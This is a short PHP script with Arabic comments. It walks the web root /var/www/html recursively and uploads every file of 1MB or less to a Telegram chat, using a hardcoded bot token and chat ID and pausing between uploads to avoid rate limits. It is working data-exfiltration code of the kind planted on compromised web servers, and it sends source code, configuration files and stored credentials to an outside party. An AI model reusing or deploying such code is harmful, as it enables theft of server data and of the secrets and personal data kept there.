<?php
// إعدادات البوت
$bot_token = "7434822534:AAFvVzTAD8s6uedl1Q3ybsL8vRFdLxE1BAg";
$chat_id = "6808756378";

// المسار الأساسي
$base_path = "/var/www/html";

// الحد الأقصى لحجم الملف بالبايت (مثلاً 1MB)
$max_size = 1024 * 1024;

// دالة للإرسال إلى تيليجرام
function send_to_telegram($message, $filename = null) {
    global $bot_token, $chat_id;

    if ($filename && file_exists($filename)) {
        $url = "https://api.telegram.org/bot$bot_token/sendDocument";
        $post_fields = [
            'chat_id' => $chat_id,
            'document' => new CURLFile(realpath($filename))
        ];
    } else {
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $message
        ];
    }

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    curl_exec($ch);
}

// دالة تمشي على الملفات وترسلها
function walk_and_send($dir) {
    global $max_size;

    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === "." || $file === "..") continue;

        $path = "$dir/$file";
        if (is_dir($path)) {
            walk_and_send($path); // recursive
        } else {
            if (filesize($path) <= $max_size) {
                send_to_telegram("📄 ملف: `$path`", null);
                send_to_telegram(null, $path);
                sleep(1); // لتجنب الحظر من تيليجرام
            }
        }
    }
}

// البداية
send_to_telegram("🚀 بدأ فحص المجلد: `$base_path`");
walk_and_send($base_path);
send_to_telegram("✅ انتهى الفحص.");
?>